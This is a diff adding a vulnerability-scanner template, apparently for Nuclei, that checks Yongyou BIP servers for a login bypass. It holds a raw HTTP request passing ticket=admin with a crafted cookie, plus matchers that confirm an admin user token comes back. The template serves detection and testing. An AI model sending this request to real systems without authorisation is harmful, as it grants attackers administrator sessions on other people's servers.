@@ -1,0 +1,33 @@
+id: poc-yaml-yongyou-bip-loginwithv8-login-bypass
+info:
+  name: Yongyou BIP LoginWithV8 Login Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication-bypass
+http:
+  - raw:
+      - |
+        GET /bi/api/Portal/LoginWithV8/?ticket=admin HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: _WorkbenchCross_=Ultraman
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"UserCode":"admin"'
+          - '<UserCode>admin</UserCode>'
+        condition: or
+        part: body
+      - type: word
+        words:
+          - '"UserToken":'
+          - '<UserToken>'
+        condition: or
+        part: body
+      - type: regex
+        regex:
+          - "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"
+        part: body
